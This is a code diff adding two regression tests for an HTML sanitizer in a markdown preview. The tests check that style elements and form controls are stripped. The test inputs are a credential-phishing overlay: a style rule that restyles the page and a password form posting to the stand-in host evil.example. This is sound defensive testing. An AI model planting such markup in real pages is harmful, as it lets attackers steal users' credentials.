@@ -163,4 +163,34 @@ describe('markdown html preview', () => {
     expect(preview.innerHTML).not.toContain('evil.example');
     expect(preview.querySelector('b')?.textContent).toBe('kept');
   });
+
+  /*
+   * The two halves of a credential-phishing overlay in the console origin.
+   * Both survived DOMPurify's `html` profile until cycle 12's repair round —
+   * the profile ALLOWS style/form/input/button, and FORBID_CONTENTS only
+   * bites tags it does not allow — so these two cases fail on the tree as it
+   * stood at the start of the round, with the sink already wrapped in
+   * sanitizeHtml.
+   */
+  it('drops a style element, so a fence cannot restyle the console', async () => {
+    const { preview } = await renderFence(
+      '<p>copy</p><style>body{position:fixed;background:#000}</style>',
+    );
+
+    expect(preview.querySelector('style')).toBeNull();
+    expect(preview.innerHTML).not.toContain('position:fixed');
+    expect(preview.textContent).toContain('copy');
+  });
+
+  it('drops form controls, so a fence cannot paint a credential prompt', async () => {
+    const { preview } = await renderFence(
+      '<form action="https://evil.example"><input type="password" name="p">' +
+        '<button>sign in</button></form>',
+    );
+
+    expect(preview.querySelector('form')).toBeNull();
+    expect(preview.querySelector('input')).toBeNull();
+    expect(preview.querySelector('button')).toBeNull();
+    expect(preview.innerHTML).not.toContain('evil.example');
+  });
 });
